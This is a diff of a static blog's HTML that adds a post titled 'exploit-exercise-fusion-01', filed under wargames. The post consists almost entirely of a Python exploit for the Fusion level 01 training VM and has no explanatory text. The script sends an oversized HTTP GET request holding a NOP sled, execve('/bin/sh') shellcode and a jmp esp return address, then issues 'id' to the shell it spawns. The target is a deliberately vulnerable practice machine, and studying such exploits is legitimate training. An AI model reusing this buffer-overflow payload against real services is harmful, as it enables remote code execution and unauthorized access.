@@ -185,7 +185,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/pwnable/" style="font-size: 10px;">pwnable</a> <a href="/tags/pwnable-tool/" style="font-size: 10px;">pwnable, tool</a>
+                        <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-tool/" style="font-size: 10px;">pwnable, tool</a>
                     </div>
                 </section>
                 
@@ -252,6 +252,71 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-exploit-exercise-fusion-01" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/09/24/exploit-exercise-fusion-01/" class="article-date">
+      <time datetime="2018-09-23T15:34:15.000Z" itemprop="datePublished">2018-09-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from socket import *</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">p = lambda x : struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HOST = &quot;192.168.111.129&quot;</span><br><span class="line">PORT = 20001</span><br><span class="line"> </span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((HOST,PORT))</span><br><span class="line"> </span><br><span class="line">#addr = a[21:31]</span><br><span class="line">jmpesp = 0x08049f4f</span><br><span class="line"> </span><br><span class="line">shellcode =&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"> </span><br><span class="line">payload = &quot;GET &quot;</span><br><span class="line">payload += &quot;\x90&quot;*(139-10-len(shellcode))</span><br><span class="line">payload += shellcode</span><br><span class="line">payload += p(jmpesp)</span><br><span class="line">payload += &quot; HTTP/1.1&quot;</span><br><span class="line"> </span><br><span class="line">s.send(payload)</span><br><span class="line">s.send(&quot;id&quot;)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/wargame/">wargame</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-exploit-exercise-fusion-00" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -291,7 +356,7 @@
       
       
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/pwnable-wargame/">pwnable, wargame</a>
+    <a class="article-category-link" href="/categories/wargame/">wargame</a>
     </div>
 
 
